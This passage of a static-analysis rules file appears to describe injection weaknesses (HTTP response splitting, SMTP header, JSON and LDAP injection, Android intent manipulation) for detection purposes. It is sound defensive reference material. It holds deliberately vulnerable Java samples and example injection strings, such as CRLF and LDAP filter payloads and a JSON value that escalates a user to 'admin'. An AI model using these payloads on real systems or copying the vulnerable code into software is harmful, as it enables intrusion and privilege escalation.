throw an <code>IllegalArgumentException</code> if you attempt to set a header with prohibited characters. If your application server prevents setting headers with new line characters, then your application is not vulnerable to HTTP Response Splitting. However, solely filtering for new line characters can leave an application vulnerable to Cookie Manipulation or Open Redirects, so care must still be taken when setting HTTP headers with user input.<br><br><b>Example 1:</b> The following code segment reads the name of the author of a weblog entry, <code>author</code>, from an HTTP request and sets it in a cookie header of an HTTP response.<br><br><pre><br>String author = request.getParameter(AUTHOR_PARAM);<br>...<br>Cookie cookie = new Cookie("author", author);<br>     cookie.setMaxAge(cookieExpiration);<br>     response.addCookie(cookie);<br></pre><br><br>Assuming a string consisting of standard alpha-numeric characters, such as "Jane Smith", is submitted in the request the HTTP response including this cookie might take the following form:<br><br><pre><br>HTTP/1.1 200 OK<br>...<br>Set-Cookie: author=Jane Smith<br>...<br></pre><br><br>However, because the value of the cookie is formed of unvalidated user input the response will only maintain this form if the value submitted for <code>AUTHOR_PARAM</code> does not contain any CR and LF characters. If an attacker submits a malicious string, such as "Wiley Hacker\r\nHTTP/1.1 200 OK\r\n...", then the HTTP response would be split into two responses of the following form:<br><br><pre><br>HTTP/1.1 200 OK<br>...<br>Set-Cookie: author=Wiley Hacker<br><br>HTTP/1.1 200 OK<br>...<br></pre><br><br>Clearly, the second response is completely controlled by the attacker and can be constructed with any header and body content desired. The ability of attacker to construct arbitrary HTTP responses permits a variety of resulting attacks, including: cross-user defacement, web and browser cache poisoning, cross-site scripting and page hijacking.<br><br>Some think that in the mobile world, classic web application vulnerabilities, such as header and cookie manipulation, do not make sense -- why would the user attack themself? However, keep in mind that the essence of mobile platforms is applications that are downloaded from various sources and run alongside each other on the same device. The likelihood of running a piece of malware next to a banking application is high, which necessitates expanding the attack surface of mobile applications to include inter-process communication.<br><br><b>Example 2:</b> The following code adapts Example 1 to the Android platform.<br><br><pre><br>...<br>        CookieManager webCookieManager = CookieManager.getInstance();<br>        String author = this.getIntent().getExtras().getString(AUTHOR_PARAM);<br>        String setCookie = "author=" + author + "; max-age=" + cookieExpiration;<br>        webCookieManager.setCookie(url, setCookie);<br><br>...<br></pre><br><br><b>Cross-User Defacement:</b> An attacker can make a single request to a vulnerable server that will cause the server to create two responses, the second of which may be misinterpreted as a response to a different request, possibly one made by another user sharing the same TCP connection with the server. This can be accomplished by convincing the user to submit the malicious request themselves, or remotely in situations where the attacker and the user share a common TCP connection to the server, such as a shared proxy server. In the best case, an attacker can leverage this ability to convince users that the application has been hacked, causing users to lose confidence in the security of the application. In the worst case, an attacker may provide specially crafted content designed to mimic the behavior of the application but redirect private information, such as account numbers and passwords, back to the attacker.<br><br><b>Cache Poisoning:</b> The impact of a maliciously constructed response can be magnified if it is cached either by a web cache used by multiple users or even the browser cache of a single user. If a response is cached in a shared web cache, such as those commonly found in proxy servers, then all users of that cache will continue receive the malicious content until the cache entry is purged. Similarly, if the response is cached in the browser of an individual user, then that user will continue to receive the malicious content until the cache entry is purged, although only the user of the local browser instance will be affected.<br><br><b>Cross-Site Scripting:</b> Once attackers have control of the responses sent by an application, they have a choice of a variety of malicious content to provide users. Cross-site scripting is common form of attack where malicious JavaScript or other code included in a response is executed in the user's browser. The variety of attacks based on XSS is almost limitless, but they commonly include transmitting private data like cookies or other session information to the attacker, redirecting the victim to web content controlled by the attacker, or performing other malicious operations on the user's machine under the guise of the vulnerable site. The most common and dangerous attack vector against users of a vulnerable application uses JavaScript to transmit session and authentication information back to the attacker who can then take complete control of the victim's account.<br><br><b>Page Hijacking:</b> In addition to using a vulnerable application to send malicious content to a user, the same root vulnerability can also be leveraged to redirect sensitive content generated by the server and intended for the user to the attacker instead. By submitting a request that results in two responses, the intended response from the server and the response generated by the attacker, an attacker can cause an intermediate node, such as a shared proxy server, to misdirect a response generated by the server for the user to the attacker. Because the request made by the attacker generates two responses, the first is interpreted as a response to the attacker's request, while the second remains in limbo. When the user makes a legitimate request through the same TCP connection, the attacker's request is already waiting and is interpreted as a response to the victim's request. The attacker then sends a second request to the server, to which the proxy server responds with the server generated request intended for the victim, thereby compromising any sensitive information in the headers or body of the response intended for the victim.<br><br><b>Open Redirect:</b> Allowing unvalidated input to control the URL used in a redirect can aid phishing attacks.
							</p>
							 								<h2>REFERENCES</h2>
																								   <p>[1] Standards Mapping - OWASP Top 10 2010 - (OWASP 2010) <em>A1 Injection</em> <br></p>
																									   <p>[2] Standards Mapping - OWASP Top 10 2013 - (OWASP 2013) <em>A1 Injection</em> <br></p>
																									   <p>[3] Standards Mapping - OWASP Top 10 2004 - (OWASP 2004) <em>A1 Unvalidated Input</em> <br></p>
																									   <p>[4] Standards Mapping - OWASP Top 10 2007 - (OWASP 2007) <em>A2 Injection Flaws</em> <br></p>
																									   <p>[5] Standards Mapping - Security Technical Implementation Guide Version 3 - (STIG 3) <em>APP3510 CAT I</em> <br></p>
																									   <p>[6] Standards Mapping - Security Technical Implementation Guide Version 3.4 - (STIG 3.4) <em>APP3510 CAT I</em> <br></p>
																									   <p>[7] Standards Mapping - Security Technical Implementation Guide Version 3.5 - (STIG 3.5) <em>APP3510 CAT I</em> <br></p>
																									   <p>[8] Standards Mapping - Security Technical Implementation Guide Version 3.6 - (STIG 3.6) <em>APP3510 CAT I</em> <br></p>
																									   <p>[9] Standards Mapping - Security Technical Implementation Guide Version 3.7 - (STIG 3.7) <em>APP3510 CAT I</em> <br></p>
																									   <p>[10] Standards Mapping - Common Weakness Enumeration - (CWE) <em>CWE ID 113</em> <br></p>
																									   <p>[11] A. Klein <em>Divide and Conquer: HTTP Response Splitting, Web Cache Poisoning Attacks, and Related Topics</em> <br></p>
																									   <p>[12] D. Crab <em>HTTP Response Splitting</em> <br></p>
																									   <p>[13] Standards Mapping - Web Application Security Consortium 24 + 2 - (WASC 24 + 2) <em>HTTP Response Splitting</em> <br></p>
																									   <p>[14] Standards Mapping - OWASP Mobile Top 10 Risks 2014 - (OWASP Mobile 2014) <em>M8 Security Decisions Via Untrusted Inputs</em> <br></p>
																									   <p>[15] Standards Mapping - Payment Card Industry Data Security Standard Version 1.2 - (PCI 1.2) <em>Requirement 6.3.1.1, Requirement 6.5.2</em> <br></p>
																									   <p>[16] Standards Mapping - Payment Card Industry Data Security Standard Version 1.1 - (PCI 1.1) <em>Requirement 6.5.1</em> <br></p>
																									   <p>[17] Standards Mapping - Payment Card Industry Data Security Standard Version 2.0 - (PCI 2.0) <em>Requirement 6.5.1</em> <br></p>
																									   <p>[18] Standards Mapping - Payment Card Industry Data Security Standard Version 3.0 - (PCI 3.0) <em>Requirement 6.5.1</em> <br></p>
																									   <p>[19] Standards Mapping - FIPS200 - (FISMA) <em>SI</em> <br></p>
																									   <p>[20] Standards Mapping - NIST Special Publication 800-53 Revision 4 - (NIST SP 800-53 Rev.4) <em>SI-10 Information Input Validation (P1)</em> <br></p>]]></description>
		<severity>MAJOR</severity>
		<tag>input-validation-and-representation</tag>
	</rule>
	<rule>
		<key>input_validation_and_representation_header_manipulation_smtp
		</key>
		<internalKey>Input Validation and Representation/Header
			Manipulation/SMTP
		</internalKey>
		<name>Header Manipulation: SMTP</name>
		<description><![CDATA[<h2>ABSTRACT</h2>
							<p>
							  Including unvalidated data in an SMTP header can enable attackers to add arbitrary headers, such as <code>CC</code> or <code>BCC</code> that can be used to leak the mail contents to themselves or use the mail server as a spam bot.
							</p>
							<h2>EXPLANATION</h2>
							<p>
							  SMTP Header Manipulation vulnerabilities occur when:<br><br>  1. Data enters an application through an untrusted source, most frequently an HTTP request in a web application.<br>  <br>  2. The data is included in an SMTP header sent to a mail server without being validated.<br>  <br>  As with many software security vulnerabilities, SMTP Header Manipulation is a means to an end, not an end in itself. At its root, the vulnerability is straightforward: an attacker passes malicious data to a vulnerable application, and the application includes the data in an SMTP header.<br><br>  One of the most common SMTP Header Manipulation attacks is used for distributing spam e-mails. If an application contains a vulnerable "Contact us" form that allows setting the subject and the body of the email, an attacker will be able to set any arbitrary content and inject a <code>CC</code> header with a list of email addresses to spam anonymously since the email will be sent from the victim server.<br><br>  <b>Example:</b> The following code segment reads the subject and body of a "Contact us" form:<br><br>  <pre><br>  String subject = request.getParameter("subject");<br>  String body = request.getParameter("body");<br>  MimeMessage message = new MimeMessage(session);<br>  message.setFrom(new InternetAddress("webform@acme.com"));<br>  message.setRecipients(Message.RecipientType.TO, InternetAddress.parse("support@acme.com"));<br>  message.setSubject("[Contact us query] " + subject);<br>  message.setText(body);<br>  Transport.send(message);<br>  </pre><br><br>  Assuming a string consisting of standard alpha-numeric characters, such as "Page not working" is submitted in the request, the SMTP headers might take the following form:<br><br>  <pre><br>  ...<br>  subject: [Contact us query] Page not working<br>  ...<br>  </pre><br><br>  However, because the value of the header is constructed from unvalidated user input the response will only maintain this form if the value submitted for <code>subject</code> does not contain any CR and LF characters. If an attacker submits a malicious string, such as "Congratulations!! You won the lottery!!!\r\ncc:victim1@mail.com,victim2@mail.com ...", then the SMTP headers would be of the following form:<br><br>  <pre><br>  ...<br>  subject: [Contact us query] Congratulations!! You won the lottery<br>  cc: victim1@mail.com,victim2@mail.com<br>  ...<br>  </pre><br><br>  This will effectively allow an attacker to craft spam messages or to send anonymous emails amongst other attacks.
							</p>
							 								<h2>REFERENCES</h2>
																								   <p>[1] Standards Mapping - OWASP Top 10 2010 - (OWASP 2010) <em>A1 Injection</em> <br></p>
																									   <p>[2] Standards Mapping - OWASP Top 10 2013 - (OWASP 2013) <em>A1 Injection</em> <br></p>
																									   <p>[3] Standards Mapping - OWASP Top 10 2004 - (OWASP 2004) <em>A1 Unvalidated Input</em> <br></p>
																									   <p>[4] Standards Mapping - OWASP Top 10 2007 - (OWASP 2007) <em>A2 Injection Flaws</em> <br></p>
																									   <p>[5] Standards Mapping - Security Technical Implementation Guide Version 3 - (STIG 3) <em>APP3510 CAT I</em> <br></p>
																									   <p>[6] Standards Mapping - Security Technical Implementation Guide Version 3.4 - (STIG 3.4) <em>APP3510 CAT I</em> <br></p>
																									   <p>[7] Standards Mapping - Security Technical Implementation Guide Version 3.5 - (STIG 3.5) <em>APP3510 CAT I</em> <br></p>
																									   <p>[8] Standards Mapping - Security Technical Implementation Guide Version 3.6 - (STIG 3.6) <em>APP3510 CAT I</em> <br></p>
																									   <p>[9] Standards Mapping - Security Technical Implementation Guide Version 3.7 - (STIG 3.7) <em>APP3510 CAT I</em> <br></p>
																									   <p>[10] Standards Mapping - Common Weakness Enumeration - (CWE) <em>CWE ID 93</em> <br></p>
																									   <p>[11] Standards Mapping - OWASP Mobile Top 10 Risks 2014 - (OWASP Mobile 2014) <em>M1 Weak Server Side Controls</em> <br></p>
																									   <p>[12] Vicente Aguilera Díaz <em>MX Injection: Capturing and Exploiting Hidden Mail Servers</em> <br></p>
																									   <p>[13] Standards Mapping - Payment Card Industry Data Security Standard Version 1.2 - (PCI 1.2) <em>Requirement 6.3.1.1, Requirement 6.5.2</em> <br></p>
																									   <p>[14] Standards Mapping - Payment Card Industry Data Security Standard Version 1.1 - (PCI 1.1) <em>Requirement 6.5.1</em> <br></p>
																									   <p>[15] Standards Mapping - Payment Card Industry Data Security Standard Version 2.0 - (PCI 2.0) <em>Requirement 6.5.1</em> <br></p>
																									   <p>[16] Standards Mapping - Payment Card Industry Data Security Standard Version 3.0 - (PCI 3.0) <em>Requirement 6.5.1</em> <br></p>
																									   <p>[17] Standards Mapping - FIPS200 - (FISMA) <em>SI</em> <br></p>
																									   <p>[18] Standards Mapping - NIST Special Publication 800-53 Revision 4 - (NIST SP 800-53 Rev.4) <em>SI-10 Information Input Validation (P1)</em> <br></p>
																									   <p>[19] OWASP <em>Testing for IMAP/SMTP Injection (OTG-INPVAL-011)</em> <br></p>]]></description>
		<severity>MAJOR</severity>
		<tag>input-validation-and-representation</tag>
	</rule>
	<rule>
		<key>input_validation_and_representation_insecure_sanitizer_policy
		</key>
		<internalKey>Input Validation and Representation/Insecure Sanitizer
			Policy
		</internalKey>
		<name>Insecure Sanitizer Policy</name>
		<description><![CDATA[<h2>ABSTRACT</h2>
							<p>
							  Permitting the usage of dangerous attributes and/or elements in the definition of an HTML sanitizer policy may allow an attacker to launch cross-site scripting (XSS) attacks.
							</p>
							<h2>EXPLANATION</h2>
							<p>
							  The umbrella term "input handling" describes functions such as validation, sanitization, filtering, and encoding/decoding of input data. Cross-site scripting, SQL injection, and process control vulnerabilities all stem from incorrect or absent input handling. Sanitization of input, which entails transforming input to an acceptable form, is typically implemented in addition to input validation. HTML sanitization refers to cleansing and scrubbing user input to allow only tags, attributes and elements that are deemed safe.<br>	Implementing a thorough HTML sanitization policy is difficult; the key to successful implementation is understanding the context in which the data will be used. Each context has its own vulnerabilities, and one size does not fit all. While it is wise to use an HTML sanitizer (for example, the OWASP HTML sanitizer) to protect against XSS vulnerabilities in web applications, improper implementation can lead to a false sense of security.<br>	<br><br><b>Example 1: </b>The following Java code, in building an HTML sanitizer policy, permits usage of attribute <code>HREF</code> globally. This can be quite dangerous when used in elements like <code>LINK</code> or <code>BASE</code>:<br><br><pre><br>...<br>public static final PolicyFactory POLICY_DEFINITION = new HtmlPolicyBuilder()<br>															.allowAttributes("HREF").matching(Pattern.compile(".*"))<br>															.globally()<br>															.toFactory();<br><br>....<br></pre><br><br>
							</p>
							 								<h2>REFERENCES</h2>
																								   <p>[1] Standards Mapping - OWASP Top 10 2007 - (OWASP 2007) <em>A1 Cross Site Scripting (XSS)</em> <br></p>
																									   <p>[2] Standards Mapping - OWASP Top 10 2010 - (OWASP 2010) <em>A2 Cross-Site Scripting (XSS)</em> <br></p>
																									   <p>[3] Standards Mapping - OWASP Top 10 2004 - (OWASP 2004) <em>A4 Cross Site Scripting</em> <br></p>
																									   <p>[4] Standards Mapping - OWASP Top 10 2013 - (OWASP 2013) <em>A5 Security Misconfiguration</em> <br></p>
																									   <p>[5] Standards Mapping - Security Technical Implementation Guide Version 3 - (STIG 3) <em>APP3510 CAT I, APP3580 CAT I</em> <br></p>
																									   <p>[6] Standards Mapping - Security Technical Implementation Guide Version 3.4 - (STIG 3.4) <em>APP3510 CAT I, APP3580 CAT I</em> <br></p>
																									   <p>[7] Standards Mapping - Security Technical Implementation Guide Version 3.5 - (STIG 3.5) <em>APP3510 CAT I, APP3580 CAT I</em> <br></p>
																									   <p>[8] Standards Mapping - Security Technical Implementation Guide Version 3.6 - (STIG 3.6) <em>APP3510 CAT I, APP3580 CAT I</em> <br></p>
																									   <p>[9] Standards Mapping - Security Technical Implementation Guide Version 3.7 - (STIG 3.7) <em>APP3510 CAT I, APP3580 CAT I</em> <br></p>
																									   <p>[10] Standards Mapping - Web Application Security Consortium 24 + 2 - (WASC 24 + 2) <em>Cross-site Scripting</em> <br></p>
																									   <p>[11] OWASP <em>Cross-Site Scripting (XSS) Prevention Cheat Sheet</em> <br></p>
																									   <p>[12] Standards Mapping - Common Weakness Enumeration - (CWE) <em>CWE ID 79, CWE ID 80</em> <br></p>
																									   <p>[13]  <em>HTML 4.01 Specification</em> W3<br></p>
																									   <p>[14]  <em>Input Validation and Representation</em> Fortify, An HP Company<br></p>
																									   <p>[15] Standards Mapping - SANS Top 25 2009 - (SANS 2009) <em>Insecure Interaction - CWE ID 079</em> <br></p>
																									   <p>[16] Standards Mapping - SANS Top 25 2010 - (SANS 2010) <em>Insecure Interaction - CWE ID 079</em> <br></p>
																									   <p>[17] Standards Mapping - SANS Top 25 2011 - (SANS Top 25 2011) <em>Insecure Interaction - CWE ID 079</em> <br></p>
																									   <p>[18] Standards Mapping - OWASP Mobile Top 10 Risks 2014 - (OWASP Mobile 2014) <em>M7 Client Side Injection</em> <br></p>
																									   <p>[19] Standards Mapping - Payment Card Industry Data Security Standard Version 1.2 - (PCI 1.2) <em>Requirement 6.3.1.1, Requirement 6.5.1</em> <br></p>
																									   <p>[20] Standards Mapping - Payment Card Industry Data Security Standard Version 1.1 - (PCI 1.1) <em>Requirement 6.5.4</em> <br></p>
																									   <p>[21] Standards Mapping - Payment Card Industry Data Security Standard Version 2.0 - (PCI 2.0) <em>Requirement 6.5.7</em> <br></p>
																									   <p>[22] Standards Mapping - Payment Card Industry Data Security Standard Version 3.0 - (PCI 3.0) <em>Requirement 6.5.7</em> <br></p>
																									   <p>[23] Standards Mapping - FIPS200 - (FISMA) <em>SI</em> <br></p>
																									   <p>[24] Standards Mapping - NIST Special Publication 800-53 Revision 4 - (NIST SP 800-53 Rev.4) <em>SI-15 Information Output Filtering (P0)</em> <br></p>
																									   <p>[25]  <em>Understanding Malicious Content Mitigation for Web Developers</em> CERT<br></p>]]></description>
		<severity>MAJOR</severity>
		<tag>input-validation-and-representation</tag>
	</rule>
	<rule>
		<key>input_validation_and_representation_intent_manipulation</key>
		<internalKey>Input Validation and Representation/Intent Manipulation
		</internalKey>
		<name>Intent Manipulation</name>
		<description><![CDATA[<h2>ABSTRACT</h2>
							<p>
							  Allowing user input to control Intent parameters could enable an attacker to control the behavior of the subsequent activity.
							</p>
							<h2>EXPLANATION</h2>
							<p>
							  <br>  An intent manipulation issue occurs when the following two conditions are met:<br><br>1. An attacker can specify the action, classname, or component of an Android Intent.<br><br>For example, an attacker may be able to specify the classname or the component to handle the intent.<br><br>2. By specifying the action, classname, or component, the attacker gains a capability that would not otherwise be permitted.<br><br>For example, the program may give the attacker the ability to transmit sensitive information to a third-party software on the device.<br><br><br><br><b>Example 1:</b> The following code uses an argument read from an HTTP request to set the classname of an intent.<br><br><pre><br>String arg = request.getParameter("arg");<br>...<br>Intent intent = new Intent();<br>...<br>intent.setClassName(arg);<br>ctx.startActivity(intent);<br>...<br></pre>
							</p>
							 								<h2>REFERENCES</h2>
																								   <p>[1] Standards Mapping - OWASP Top 10 2004 - (OWASP 2004) <em>A1 Unvalidated Input</em> <br></p>
																									   <p>[2] Standards Mapping - OWASP Top 10 2007 - (OWASP 2007) <em>A4 Insecure Direct Object Reference</em> <br></p>
																									   <p>[3] Standards Mapping - OWASP Top 10 2010 - (OWASP 2010) <em>A4 Insecure Direct Object References</em> <br></p>
																									   <p>[4] Standards Mapping - OWASP Top 10 2013 - (OWASP 2013) <em>A4 Insecure Direct Object References</em> <br></p>
																									   <p>[5] Standards Mapping - Security Technical Implementation Guide Version 3 - (STIG 3) <em>APP3510 CAT I, APP3600 CAT II</em> <br></p>
																									   <p>[6] Standards Mapping - Security Technical Implementation Guide Version 3.4 - (STIG 3.4) <em>APP3510 CAT I, APP3600 CAT II</em> <br></p>
																									   <p>[7] Standards Mapping - Security Technical Implementation Guide Version 3.5 - (STIG 3.5) <em>APP3510 CAT I, APP3600 CAT II</em> <br></p>
																									   <p>[8] Standards Mapping - Security Technical Implementation Guide Version 3.6 - (STIG 3.6) <em>APP3510 CAT I, APP3600 CAT II</em> <br></p>
																									   <p>[9] Standards Mapping - Security Technical Implementation Guide Version 3.7 - (STIG 3.7) <em>APP3510 CAT I, APP3600 CAT II</em> <br></p>
																									   <p>[10] Standards Mapping - Common Weakness Enumeration - (CWE) <em>CWE ID 99</em> <br></p>
																									   <p>[11]  <em>Intent</em> <br></p>
																									   <p>[12] Standards Mapping - OWASP Mobile Top 10 Risks 2014 - (OWASP Mobile 2014) <em>M8 Security Decisions Via Untrusted Inputs</em> <br></p>
																									   <p>[13] Standards Mapping - Payment Card Industry Data Security Standard Version 1.2 - (PCI 1.2) <em>Requirement 6.3.1.1, Requirement 6.5.4</em> <br></p>
																									   <p>[14] Standards Mapping - Payment Card Industry Data Security Standard Version 1.1 - (PCI 1.1) <em>Requirement 6.5.1</em> <br></p>
																									   <p>[15] Standards Mapping - Payment Card Industry Data Security Standard Version 2.0 - (PCI 2.0) <em>Requirement 6.5.8</em> <br></p>
																									   <p>[16] Standards Mapping - Payment Card Industry Data Security Standard Version 3.0 - (PCI 3.0) <em>Requirement 6.5.8</em> <br></p>
																									   <p>[17] Standards Mapping - FIPS200 - (FISMA) <em>SI</em> <br></p>
																									   <p>[18] Standards Mapping - NIST Special Publication 800-53 Revision 4 - (NIST SP 800-53 Rev.4) <em>SI-10 Information Input Validation (P1)</em> <br></p>]]></description>
		<severity>MAJOR</severity>
		<tag>input-validation-and-representation</tag>
	</rule>
	<rule>
		<key>input_validation_and_representation_json_injection</key>
		<internalKey>Input Validation and Representation/JSON Injection
		</internalKey>
		<name>JSON Injection</name>
		<description><![CDATA[<h2>ABSTRACT</h2>
							<p>
							  The method writes unvalidated input into JSON. This call could allow an attacker to inject arbitrary elements or attributes into the JSON entity.
							</p>
							<h2>EXPLANATION</h2>
							<p>
							  JSON injection occurs when:<br><br>1. Data enters a program from an untrusted source.<br><br><br>2. The data is written to a JSON stream.<br><br>Applications typically use JSON to store data or send messages. When used to store data, JSON is often treated like cached data and may potentially contain sensitive information. When used to send messages, JSON is often used in conjunction with a RESTful service and can be used to transmit sensitive information such as authentication credentials.<br><br>The semantics of JSON documents and messages can be altered if an application constructs JSON from unvalidated input. In a relatively benign case, an attacker may be able to insert extraneous elements that cause an application to throw an exception while parsing a JSON document or request. In a more serious case, such as that involving JSON injection, an attacker may be able to insert extraneous elements that allow for the predictable manipulation of business critical values within a JSON document or request. In some cases, JSON injection can lead to cross-site scripting or dynamic code evaluation.<br><br><b>Example 1: </b>The following Java code uses Jackson to serialize user account authentication information for non-privileged users (those with a role of "default" as opposed to privileged users with a role of "admin") from user-controlled input variables <code>username</code> and <code>password</code> to the JSON file located at <code>~/user_info.json</code>:<br><br><pre><br>...<br><br>JsonFactory jfactory = new JsonFactory();<br><br>JsonGenerator jGenerator = jfactory.createJsonGenerator(new File("~/user_info.json"), JsonEncoding.UTF8);<br><br>jGenerator.writeStartObject();<br><br>jGenerator.writeFieldName("username");<br>jGenerator.writeRawValue("\"" + username + "\"");<br><br>jGenerator.writeFieldName("password");<br>jGenerator.writeRawValue("\"" + password + "\"");<br><br>jGenerator.writeFieldName("role");<br>jGenerator.writeRawValue("\"default\"");<br><br>jGenerator.writeEndObject();<br><br>jGenerator.close();<br></pre><br><br>Yet, because the JSON serialization is performed using <code>JsonGenerator.writeRawValue()</code>, the untrusted data in <code>username</code> and <code>password</code> will not be validated to escape JSON-related special characters. This allows a user to arbitrarily insert JSON keys, possibly changing the structure of the serialized JSON. In this example, if the non-privileged user <code>mallory</code> with password <code>Evil123!</code> were to append <code>","role":"admin</code> to her username when entering it at the prompt that sets the value of the <code>username</code> variable, the resulting JSON saved to <code>~/user_info.json</code> would be:<br><br><pre><br>{<br>  "username":"mallory",<br>  "role":"admin",<br>  "password":"Evil123!",<br>  "role":"default"<br>}<br></pre><br><br>If this serialized JSON file were then deserialized to an <code>HashMap</code> object with Jackson's <code>JsonParser</code> as so:<br><br><pre><br>JsonParser jParser = jfactory.createJsonParser(new File("~/user_info.json"));<br><br>while (jParser.nextToken() != JsonToken.END_OBJECT) {<br><br>  String fieldname = jParser.getCurrentName();<br><br>  if ("username".equals(fieldname)) {<br>    jParser.nextToken();<br>    userInfo.put(fieldname, jParser.getText());<br>  }<br><br>  if ("password".equals(fieldname)) {<br>    jParser.nextToken();<br>    userInfo.put(fieldname, jParser.getText());<br>  }<br><br>  if ("role".equals(fieldname)) {<br>    jParser.nextToken();<br>    userInfo.put(fieldname, jParser.getText());<br>  }<br><br>  if (userInfo.size() == 3)<br>    break;<br>}<br><br>jParser.close();<br></pre><br><br>The resulting values for the <code>username</code>, <code>password</code>, and <code>role</code> keys in the <code>HashMap</code> object would be <code>mallory</code>, <code>Evil123!</code>, and <code>admin</code> respectively. Without further verification that the deserialized JSON values are valid, the application will incorrectly assign user <code>mallory</code> "admin" privileges.
							</p>
							 								<h2>REFERENCES</h2>
																								   <p>[1] Standards Mapping - OWASP Top 10 2010 - (OWASP 2010) <em>A1 Injection</em> <br></p>
																									   <p>[2] Standards Mapping - OWASP Top 10 2013 - (OWASP 2013) <em>A1 Injection</em> <br></p>
																									   <p>[3] Standards Mapping - OWASP Top 10 2007 - (OWASP 2007) <em>A2 Injection Flaws</em> <br></p>
																									   <p>[4] Standards Mapping - OWASP Top 10 2004 - (OWASP 2004) <em>A6 Injection Flaws</em> <br></p>
																									   <p>[5] Standards Mapping - Security Technical Implementation Guide Version 3 - (STIG 3) <em>APP3510 CAT I</em> <br></p>
																									   <p>[6] Standards Mapping - Security Technical Implementation Guide Version 3.4 - (STIG 3.4) <em>APP3510 CAT I</em> <br></p>
																									   <p>[7] Standards Mapping - Security Technical Implementation Guide Version 3.5 - (STIG 3.5) <em>APP3510 CAT I</em> <br></p>
																									   <p>[8] Standards Mapping - Security Technical Implementation Guide Version 3.6 - (STIG 3.6) <em>APP3510 CAT I</em> <br></p>
																									   <p>[9] Standards Mapping - Security Technical Implementation Guide Version 3.7 - (STIG 3.7) <em>APP3510 CAT I</em> <br></p>
																									   <p>[10] Standards Mapping - Common Weakness Enumeration - (CWE) <em>CWE ID 91</em> <br></p>
																									   <p>[11] Standards Mapping - OWASP Mobile Top 10 Risks 2014 - (OWASP Mobile 2014) <em>M7 Client Side Injection</em> <br></p>
																									   <p>[12] Standards Mapping - Payment Card Industry Data Security Standard Version 1.2 - (PCI 1.2) <em>Requirement 6.3.1.1, Requirement 6.5.2</em> <br></p>
																									   <p>[13] Standards Mapping - Payment Card Industry Data Security Standard Version 2.0 - (PCI 2.0) <em>Requirement 6.5.1</em> <br></p>
																									   <p>[14] Standards Mapping - Payment Card Industry Data Security Standard Version 3.0 - (PCI 3.0) <em>Requirement 6.5.1</em> <br></p>
																									   <p>[15] Standards Mapping - Payment Card Industry Data Security Standard Version 1.1 - (PCI 1.1) <em>Requirement 6.5.6</em> <br></p>
																									   <p>[16] Standards Mapping - FIPS200 - (FISMA) <em>SI</em> <br></p>
																									   <p>[17] Standards Mapping - NIST Special Publication 800-53 Revision 4 - (NIST SP 800-53 Rev.4) <em>SI-10 Information Input Validation (P1)</em> <br></p>]]></description>
		<severity>MAJOR</severity>
		<tag>input-validation-and-representation</tag>
	</rule>
	<rule>
		<key>input_validation_and_representation_ldap_injection</key>
		<internalKey>Input Validation and Representation/LDAP Injection
		</internalKey>
		<name>LDAP Injection</name>
		<description><![CDATA[<h2>ABSTRACT</h2>
							<p>
							  Constructing a dynamic LDAP filter with user input could allow an attacker to modify the statement's meaning.
							</p>
							<h2>EXPLANATION</h2>
							<p>
							  LDAP injection errors occur when:<br><br>1.	Data enters a program from an untrusted source.<br><br>In this case HP Fortify Static Code Analyzer could not determine that the source of the data is trusted.<br><br>2.	The data is used to dynamically construct a LDAP filter.<br><br><b>Example 1:</b> The following code dynamically constructs and executes an LDAP query that retrieves records for all the employees who report to a given manager. The manager's name is read from an HTTP request, and is therefore untrusted.<br><br><pre><br>...<br>DirContext ctx = new InitialDirContext(env);<br><br>String managerName = request.getParameter("managerName");<br><br>//retrieve all of the employees who report to a manager<br><br>String filter = "(manager=" + managerName + ")";<br><br>NamingEnumeration employees = ctx.search("ou=People,dc=example,dc=com",<br>        			                 filter);<br>...<br></pre><br><br>Under normal conditions, such as searching for employees who report to the manager John Smith, the filter that this code executes will look like the following:<br><br><pre><br>(manager=Smith, John)<br></pre><br><br>However, because the filter is constructed dynamically by concatenating a constant base query string and a user input string, the query only behaves correctly if <code>managerName</code> does not contain any LDAP meta characters. If an attacker enters the string <code>Hacker, Wiley)(|(objectclass=*)</code> for <code>managerName</code>, then the query becomes the following:<br><br><pre><br>(manager=Hacker, Wiley)(|(objectclass=*))<br></pre><br><br>Based on the permissions with which the query is executed, the addition of the <code>|(objectclass=*)</code> condition causes the filter to match against all entries in the directory, and allows the attacker to retrieve information about the entire pool of users. Depending on the permissions with which the LDAP query is performed, the breadth of this attack may be limited, but if the attacker can control the command structure of the query, such an attack can at least affect all records that the user the LDAP query is executed as can access.
							</p>
							 								<h2>REFERENCES</h2>
																								   <p>[1] Standards Mapping - OWASP Top 10 2010 - (OWASP 2010) <em>A1 Injection</em> <br></p>
																									   <p>[2] Standards Mapping - OWASP Top 10 2013 - (OWASP 2013) <em>A1 Injection</em> <br></p>
																									   <p>[3] Standards Mapping - OWASP Top 10 2007 - (OWASP 2007) <em>A2 Injection Flaws</em> <br></p>
																									   <p>[4] Standards Mapping - OWASP Top 10 2004 - (OWASP 2004) <em>A6 Injection Flaws</em> <br></p>
																									   <p>[5] Standards Mapping - Security Technical Implementation Guide Version 3 - (STIG 3) <em>APP3510 CAT I</em> <br></p>
																									   <p>[6] Standards Mapping - Security Technical Implementation Guide Version 3.4 - (STIG 3.4) <em>APP3510 CAT I</em> <br></p>
																									   <p>[7] Standards Mapping - Security Technical Implementation Guide Version 3.5 - (STIG 3.5) <em>APP3510 CAT I</em> <br></p>
																									   <p>[8] Standards Mapping - Security Technical Implementation Guide Version 3.6 - (STIG 3.6) <em>APP3510 CAT I</em> <br></p>
																									   <p>[9] Standards Mapping - Security Technical Implementation Guide Version 3.7 - (STIG 3.7) <em>APP3510 CAT I</em> <br></p>
																									   <p>[10] Standards Mapping - Common Weakness Enumeration - (CWE) <em>CWE ID 90</em> <br></p>
																									   <p>[11] Standards Mapping - SANS Top 25 2009 - (SANS 2009) <em>Insecure Interaction - CWE ID 116</em> <br></p>
																									   <p>[12] Standards Mapping - Web Application Security Consortium 24 + 2 - (WASC 24 + 2) <em>LDAP Injection</em> <br></p>
																									   <p>[13] Standards Mapping - OWASP Mobile Top 10 Risks 2014 - (OWASP Mobile 2014) <em>M1 Weak Server Side Controls</em> <br></p>
																									   <p>[14] Standards Mapping - Payment Card Industry Data Security Standard Version 1.2 - (PCI 1.2) <em>Requirement 6.3.1.1, Requirement 6.5.2</em> <br></p>
																									   <p>[15] Standards Mapping - Payment Card Industry Data Security Standard Version 2.0 - (PCI 2.0) <em>Requirement 6.5.1</em> <br></p>
